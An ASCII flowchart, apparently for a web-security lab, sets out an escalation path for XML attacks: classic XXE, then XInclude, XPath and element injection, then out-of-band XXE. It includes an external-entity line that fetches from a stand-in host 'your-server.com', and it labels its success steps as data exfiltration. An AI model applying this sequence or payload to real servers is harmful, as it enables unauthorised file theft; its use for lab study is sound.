Start → Can you send XML to the server? (Content-Type: application/xml)
 │
 ├─ No → Switch to form-encoded POST parameters (application/x-www-form-urlencoded)
 │
 └─ Yes → Try Classic XXE <!DOCTYPE> payload
       │
       ├─ Works? → Success, exfiltrate data
       │
       └─ Fails (blocked / parser disables DTD) → Try XInclude
             │
             ├─ Works? → Success, exfiltrate file content
             │
             └─ Fails → Try XML parameter-based injection
                   │
                   ├─ Server expects specific root element / tag? 
                   │      → Copy structure from normal request or lab page
                   │
                   └─ Try XPath injection / XML element text injection
                         │
                         ├─ Works? → Success
                         │
                         └─ Fails → Try OOB XXE / external entity fetch
                               │
                               ├─ Server allows HTTP(S) requests? 
                               │      → Include remote entity like:
                               │        <!ENTITY xxe SYSTEM "http://your-server.com/test.txt">
                               │
                               └─ Server blocks everything → Lab may only accept specific XInclude format
